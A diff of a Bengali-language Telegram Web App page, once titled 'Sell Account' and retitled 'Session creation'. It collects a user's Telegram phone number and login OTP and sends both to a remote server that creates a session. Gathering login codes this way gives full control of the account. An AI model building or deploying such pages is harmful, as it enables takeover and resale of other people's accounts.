@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sell Account</title>
+    <title>সেশন তৈরি</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * { box-sizing: border-box; }
@@ -46,23 +46,22 @@
             transition: background 0.2s;
         }
         button:hover { background: #006699; }
-        button:active { opacity: 0.8; }
         .hidden { display: none; }
         #result { text-align: center; font-size: 18px; margin-top: 10px; }
-        .error { color: red; }
         .success { color: green; }
+        .error { color: red; }
     </style>
 </head>
 <body>
     <div class="container" id="app">
-        <h2>📱 Sell Account</h2>
+        <h2>📱 সেশন তৈরি</h2>
         <div id="step1">
-            <p>আপনার ফোন নম্বর দিন:</p>
+            <p>আপনার টেলিগ্রাম ফোন নম্বর দিন:</p>
             <input type="tel" id="phone" placeholder="+8801XXXXXXXXX">
-            <button onclick="sendOTP()">সাবমিট</button>
+            <button onclick="sendOTP()">ওটিপি পাঠান</button>
         </div>
         <div id="step2" class="hidden">
-            <p>ওটিপি কোড দিন:</p>
+            <p>ওটিপি কোড দিন (কনসোলে দেখুন):</p>
             <input type="text" id="otp" placeholder="123456" inputmode="numeric">
             <button onclick="verifyOTP()">যাচাই করুন</button>
         </div>
@@ -73,27 +72,18 @@
         const tg = window.Telegram.WebApp;
         tg.ready();
 
-        // ⚠️ আপনার সার্ভারের URL দিন (যেখানে main.py চলছে)
-        const API_BASE = "https://your-server-domain.com";  // যেমন: "http://localhost:5000" অথবা আপনার ডোমেইন
+        // ⚠️ আপনার সার্ভারের পাবলিক URL দিন (যেমন ngrok দেওয়া লিংক)
+        const API_BASE = "https://your-server-domain.com";  // যেমন "http://localhost:5000" (যদি একই নেটওয়ার্কে হোস্ট করেন)
 
         let tempPhone = '';
 
-        function showError(msg) {
-            tg.showPopup({ title: '❌', message: msg });
-        }
-
-        function showSuccess(msg) {
-            tg.showPopup({ title: '✅', message: msg });
-        }
+        function showError(msg) { tg.showPopup({ title: '❌', message: msg }); }
+        function showSuccess(msg) { tg.showPopup({ title: '✅', message: msg }); }
 
         function sendOTP() {
             const phone = document.getElementById('phone').value.trim();
-            if (!phone) {
-                showError('দয়া করে ফোন নম্বর দিন');
-                return;
-            }
-            if (phone.length < 10) {
-                showError('সঠিক নম্বর দিন (কমপক্ষে ১০ ডিজিট)');
+            if (!phone || phone.length < 10) {
+                showError('সঠিক ফোন নম্বর দিন');
                 return;
             }
             tempPhone = phone;
@@ -107,15 +97,12 @@
                 if (data.success) {
                     document.getElementById('step1').classList.add('hidden');
                     document.getElementById('step2').classList.remove('hidden');
-                    showSuccess('ওটিপি পাঠানো হয়েছে');
+                    showSuccess('ওটিপি পাঠানো হয়েছে (কনসোল চেক করুন)');
                 } else {
-                    showError(data.message || 'সাবমিট করতে ব্যর্থ');
+                    showError(data.message || 'সাবমিট ব্যর্থ');
                 }
             })
-            .catch(err => {
-                console.error(err);
-                showError('সার্ভারে যোগাযোগ করতে পারছি না');
-            });
+            .catch(() => showError('সার্ভারে যোগাযোগ ব্যর্থ'));
         }
 
         function verifyOTP() {
@@ -141,10 +128,7 @@
                     showError(data.message || 'যাচাই ব্যর্থ');
                 }
             })
-            .catch(err => {
-                console.error(err);
-                showError('সার্ভারে সমস্যা');
-            });
+            .catch(() => showError('সার্ভারে সমস্যা'));
         }
     </script>
 </body>
